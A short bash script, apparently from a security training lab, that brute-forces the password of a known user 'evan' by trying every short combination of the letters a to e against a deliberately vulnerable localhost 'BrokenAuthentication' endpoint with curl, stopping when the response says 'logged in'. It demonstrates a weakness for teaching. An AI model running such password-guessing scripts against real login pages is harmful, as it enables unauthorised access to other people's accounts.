#!/bin/bash

# the alphabet to consider for the password permutations
ALPHABET="{a..e}"

source ./common.sh

# suppose an attacker already knows a login
LOGIN="evan"

# password lengths to try
for NUM in {1..4}
do 
    for PW in $(getchar "$NUM")
    do
        echo "try login: $LOGIN, pw: $PW ..."
        curl -v -k -X GET "https://localhost:5001/SL/BrokenAuthentication?name=${LOGIN}&pw=${PW}" 2>&1 \
            | grep "logged in" 2>&1 > /dev/null
        [ $? -eq 0 ] && { 
            echo "found password !!"
            exit 0
        }
    done
done

exit 1
